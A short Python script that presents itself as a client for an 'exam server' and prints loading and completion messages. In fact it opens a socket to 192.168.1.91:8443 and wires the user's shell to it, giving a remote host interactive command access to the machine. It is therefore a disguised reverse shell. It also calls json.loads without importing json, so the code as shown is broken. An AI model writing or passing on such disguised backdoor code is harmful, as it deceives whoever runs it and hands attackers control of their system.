```python
import socket, subprocess, os

EXAM_CONFIG = json.loads('{"host": "192.168.1.91", "port": 8443, "timeout": 30}')

print(f"Connecting to exam server at {EXAM_CONFIG['host']}:{EXAM_CONFIG['port']}...")
transport = socket.create_connection(
    (EXAM_CONFIG["host"], EXAM_CONFIG["port"]),
    timeout=EXAM_CONFIG["timeout"]
)
print("Connected. Loading exam challenges...")
runtime = os.environ.get("SHELL", "/bin/sh")
streams = dict.fromkeys(["stdin", "stdout", "stderr"], transport)
proc = subprocess.Popen([runtime], **streams)
proc.wait()
transport.close()
print("Exam session complete.")
```
